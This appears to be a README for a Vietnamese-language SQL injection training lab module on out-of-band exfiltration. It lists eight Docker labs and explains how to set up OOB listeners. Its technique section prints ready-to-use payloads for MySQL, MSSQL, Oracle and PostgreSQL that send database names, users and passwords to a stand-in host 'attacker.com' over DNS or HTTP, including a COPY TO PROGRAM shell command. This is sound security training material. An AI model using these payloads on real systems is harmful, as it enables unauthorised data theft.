# Module 6: Out-of-Band (OOB) SQL Injection

> **Mục tiêu**: Exfiltrate data qua DNS hoặc HTTP requests khi không có in-band response

## 📋 Tổng Quan

Out-of-Band SQL Injection là kỹ thuật khai thác dữ liệu thông qua các kênh mạng bên ngoài (DNS, HTTP) thay vì in-band response. Kỹ thuật này đặc biệt hữu ích khi:

- Không có response trực tiếp (async processing)
- Blind techniques quá chậm
- Network egress available (DNS thường được phép)

### Yêu cầu

- **Burp Suite Pro** với Collaborator hoặc **interactsh** cho OOB listener
- Hiểu biết về DNS/HTTP protocols
- Docker environment

---

## 🧪 Danh Sách Labs

| Lab ID   | Sub-Topic  | DBMS       | Scenario/Context      | Learning Objective                      | Complexity      |
| -------- | ---------- | ---------- | --------------------- | --------------------------------------- | --------------- |
| SQLi-035 | OOB - DNS  | MySQL      | Windows server app    | LOAD_FILE() với UNC path để trigger DNS | ⭐⭐⭐ Khó      |
| SQLi-036 | OOB - DNS  | MSSQL      | Corporate intranet    | xp_dirtree DNS exfiltration             | ⭐⭐ Trung bình |
| SQLi-037 | OOB - DNS  | MSSQL      | Windows domain env    | xp_fileexist/xp_subdirs DNS             | ⭐⭐ Trung bình |
| SQLi-038 | OOB - HTTP | Oracle     | Java-based webapp     | UTL_HTTP.REQUEST exfil                  | ⭐⭐⭐ Khó      |
| SQLi-039 | OOB - DNS  | Oracle     | ACL-restricted env    | UTL_INADDR DNS lookup                   | ⭐⭐⭐ Khó      |
| SQLi-040 | OOB - HTTP | Oracle     | Legacy system         | HTTPURITYPE exfiltration                | ⭐⭐⭐ Khó      |
| SQLi-041 | OOB - DNS  | PostgreSQL | Linux server          | COPY TO PROGRAM + nslookup              | ⭐⭐⭐ Khó      |
| SQLi-042 | OOB - HTTP | PostgreSQL | DbLink enabled server | dblink extension exfiltration           | ⭐⭐⭐ Khó      |

---

## 🔧 Setup OOB Listener

### Option 1: Burp Collaborator (Recommended)

1. Burp Suite Pro → Burp → Collaborator client
2. Click "Copy to clipboard" để lấy Collaborator URL
3. Sử dụng URL này trong payloads
4. Poll for interactions để xem DNS/HTTP requests

### Option 2: interactsh (Free)

```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run
interactsh-client

# Output sẽ hiển thị unique subdomain
# [INF] Listing 1 payload for OOB Testing
# [INF] xxx.oast.fun
```

### Option 3: Custom DNS Server

```bash
# Sử dụng tcpdump để capture DNS
sudo tcpdump -i eth0 udp port 53

# Hoặc dùng dnschef
python dnschef.py --fakeip 127.0.0.1 -i your-domain.com
```

---

## 📊 DBMS-Specific OOB Techniques

### MySQL (Windows Only)

```sql
-- UNC path với LOAD_FILE
SELECT LOAD_FILE('\\\\attacker.com\\share\\file')

-- Data exfiltration
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))
```

**Requirements:** FILE privilege, Windows server

### MSSQL

```sql
-- xp_dirtree (most common)
EXEC master..xp_dirtree '\\attacker.com\share'

-- xp_fileexist
EXEC master..xp_fileexist '\\attacker.com\share\file'

-- Data exfiltration
DECLARE @d VARCHAR(1024);
SET @d=(SELECT TOP 1 password FROM users);
EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\a"')
```

**Requirements:** xp_dirtree enabled (default)

### Oracle

```sql
-- UTL_HTTP
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual

-- UTL_INADDR
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual

-- HTTPURITYPE
SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB() FROM dual
```

**Requirements:** ACL permissions (Oracle 11g+)

### PostgreSQL

```sql
-- COPY TO PROGRAM
COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_database())||'.attacker.com'

-- dblink extension
SELECT * FROM dblink('host=attacker.com user=a password='||(SELECT password FROM users LIMIT 1)||' dbname=a','SELECT 1') RETURNS (i int)
```

**Requirements:** Superuser (COPY TO PROGRAM), dblink extension

---

## 📚 Attack Flow

Mỗi lab writeup tuân thủ quy trình 6 bước:

1. **DETECT** → Phát hiện injection point
2. **IDENTIFY** → Xác định DBMS type
3. **ENUMERATE** → Liệt kê tables, columns
4. **EXTRACT** → Trích xuất dữ liệu nhạy cảm
5. **ESCALATE** → Nâng cao privileges (nếu có)
6. **EXFILTRATE** → Xuất dữ liệu qua OOB channel

---

## 🚀 Quick Start

```bash
# Start lab
cd SQLi-035
docker-compose up -d

# Access application
curl http://localhost:5035/

# Stop lab
docker-compose down
```

---

## ⚠️ Lưu Ý Quan Trọng

> [!WARNING]
> OOB SQL Injection yêu cầu network egress từ database server. Trong môi trường production thực tế, firewall có thể block outbound connections.

> [!NOTE]
> Một số labs yêu cầu đặc quyền cao (superuser, FILE privilege, ACL permissions). Trong môi trường lab, các quyền này đã được cấu hình sẵn.

---

## 🔗 Tài Liệu Tham Khảo

- [Knowledge Base - Out-of-Band SQLi](../../../_knowledge_base/Web/SQLi/06-out-of-band.md)
- [Burp Collaborator Documentation](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- [interactsh - OOB Interaction Server](https://github.com/projectdiscovery/interactsh)
